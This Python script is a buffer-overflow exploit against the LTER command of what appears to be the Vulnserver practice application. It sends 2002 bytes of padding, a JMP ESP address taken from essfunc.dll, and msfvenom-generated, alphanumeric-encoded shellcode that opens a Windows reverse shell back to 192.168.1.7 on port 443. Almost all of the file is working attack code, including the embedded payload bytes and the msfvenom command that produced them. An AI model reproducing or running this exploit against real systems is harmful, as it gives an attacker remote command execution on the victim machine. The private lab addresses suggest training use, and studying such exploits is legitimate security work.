import socket
import os
import sys

host = '192.168.1.15'
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.7 LPORT=443 BUFFERREGISTER=esp -e x86/alpha_mixed -b "\x00\x0a\x0d" -f python
buf =  ""
buf += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x69\x6c\x39\x78\x4f\x72\x55\x50\x75\x50\x45\x50\x75"
buf += "\x30\x6e\x69\x4d\x35\x45\x61\x59\x50\x50\x64\x4c\x4b"
buf += "\x52\x70\x64\x70\x4c\x4b\x72\x72\x36\x6c\x6e\x6b\x63"
buf += "\x62\x56\x74\x6c\x4b\x54\x32\x36\x48\x76\x6f\x38\x37"
buf += "\x63\x7a\x45\x76\x50\x31\x6b\x4f\x4c\x6c\x55\x6c\x75"
buf += "\x31\x61\x6c\x73\x32\x44\x6c\x47\x50\x6b\x71\x48\x4f"
buf += "\x46\x6d\x55\x51\x49\x57\x79\x72\x6a\x52\x61\x42\x73"
buf += "\x67\x6e\x6b\x43\x62\x54\x50\x4e\x6b\x72\x6a\x55\x6c"
buf += "\x4e\x6b\x70\x4c\x34\x51\x63\x48\x7a\x43\x70\x48\x47"
buf += "\x71\x4e\x31\x62\x71\x6e\x6b\x33\x69\x57\x50\x67\x71"
buf += "\x38\x53\x6c\x4b\x30\x49\x45\x48\x39\x73\x66\x5a\x77"
buf += "\x39\x4e\x6b\x30\x34\x6e\x6b\x66\x61\x69\x46\x65\x61"
buf += "\x69\x6f\x6e\x4c\x59\x51\x5a\x6f\x66\x6d\x56\x61\x4f"
buf += "\x37\x76\x58\x39\x70\x42\x55\x4c\x36\x63\x33\x61\x6d"
buf += "\x68\x78\x67\x4b\x33\x4d\x66\x44\x73\x45\x6a\x44\x30"
buf += "\x58\x4c\x4b\x53\x68\x54\x64\x66\x61\x48\x53\x42\x46"
buf += "\x4c\x4b\x34\x4c\x50\x4b\x4e\x6b\x46\x38\x65\x4c\x55"
buf += "\x51\x4a\x73\x6e\x6b\x57\x74\x4c\x4b\x77\x71\x48\x50"
buf += "\x6b\x39\x32\x64\x71\x34\x65\x74\x61\x4b\x33\x6b\x53"
buf += "\x51\x30\x59\x30\x5a\x52\x71\x6b\x4f\x4d\x30\x51\x4f"
buf += "\x33\x6f\x61\x4a\x4c\x4b\x64\x52\x6a\x4b\x4c\x4d\x31"
buf += "\x4d\x32\x48\x50\x33\x70\x32\x57\x70\x47\x70\x32\x48"
buf += "\x64\x37\x50\x73\x47\x42\x33\x6f\x42\x74\x73\x58\x62"
buf += "\x6c\x33\x47\x61\x36\x57\x77\x39\x6f\x79\x45\x38\x38"
buf += "\x6c\x50\x65\x51\x43\x30\x47\x70\x31\x39\x4b\x74\x50"
buf += "\x54\x32\x70\x72\x48\x77\x59\x4b\x30\x50\x6b\x73\x30"
buf += "\x39\x6f\x39\x45\x70\x50\x36\x30\x62\x70\x36\x30\x67"
buf += "\x30\x50\x50\x71\x50\x56\x30\x31\x78\x39\x7a\x36\x6f"
buf += "\x79\x4f\x6b\x50\x39\x6f\x38\x55\x5a\x37\x73\x5a\x34"
buf += "\x45\x61\x78\x69\x50\x79\x38\x46\x61\x65\x57\x42\x48"
buf += "\x56\x62\x73\x30\x35\x51\x6d\x6b\x6b\x39\x39\x76\x42"
buf += "\x4a\x76\x70\x56\x36\x31\x47\x51\x78\x4a\x39\x79\x35"
buf += "\x31\x64\x61\x71\x39\x6f\x38\x55\x6c\x45\x79\x50\x70"
buf += "\x74\x36\x6c\x59\x6f\x30\x4e\x43\x38\x74\x35\x38\x6c"
buf += "\x50\x68\x4c\x30\x58\x35\x6c\x62\x63\x66\x59\x6f\x6a"
buf += "\x75\x31\x78\x30\x63\x62\x4d\x73\x54\x43\x30\x4c\x49"
buf += "\x59\x73\x42\x77\x52\x77\x56\x37\x50\x31\x78\x76\x53"
buf += "\x5a\x45\x42\x42\x79\x56\x36\x4a\x42\x4b\x4d\x51\x76"
buf += "\x6f\x37\x42\x64\x54\x64\x67\x4c\x53\x31\x56\x61\x4c"
buf += "\x4d\x52\x64\x44\x64\x32\x30\x79\x56\x75\x50\x62\x64"
buf += "\x36\x34\x32\x70\x32\x76\x32\x76\x76\x36\x47\x36\x66"
buf += "\x36\x32\x6e\x42\x76\x50\x56\x31\x43\x46\x36\x62\x48"
buf += "\x61\x69\x38\x4c\x35\x6f\x6d\x56\x4b\x4f\x49\x45\x6e"
buf += "\x69\x39\x70\x32\x6e\x56\x36\x72\x66\x4b\x4f\x44\x70"
buf += "\x72\x48\x46\x68\x6b\x37\x47\x6d\x45\x30\x69\x6f\x58"
buf += "\x55\x6f\x4b\x38\x70\x4f\x45\x69\x32\x52\x76\x55\x38"
buf += "\x6d\x76\x6e\x75\x6d\x6d\x4d\x4d\x4b\x4f\x4a\x75\x55"
buf += "\x6c\x74\x46\x51\x6c\x47\x7a\x4b\x30\x6b\x4b\x49\x70"
buf += "\x74\x35\x46\x65\x4f\x4b\x61\x57\x37\x63\x32\x52\x30"
buf += "\x6f\x63\x5a\x63\x30\x33\x63\x39\x6f\x39\x45\x41\x41"

# JMP ESP at 0x62501203 in essfunc.dll
junk = 'A' * 2002
junk += '\x03\x12\x50\x62'
#junk += 'C' * 4
#junk += 'D' * (3500 - len(junk))
junk += buf

#shellcode = 'w00tw00t'
#shellcode += '\xcc' * 1000

sploit = 'LTER /.../' + junk

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
#expl.recv(1024)
#expl.send('GDOG ' + shellcode)
expl.recv(1024)
expl.send(sploit)
expl.close()
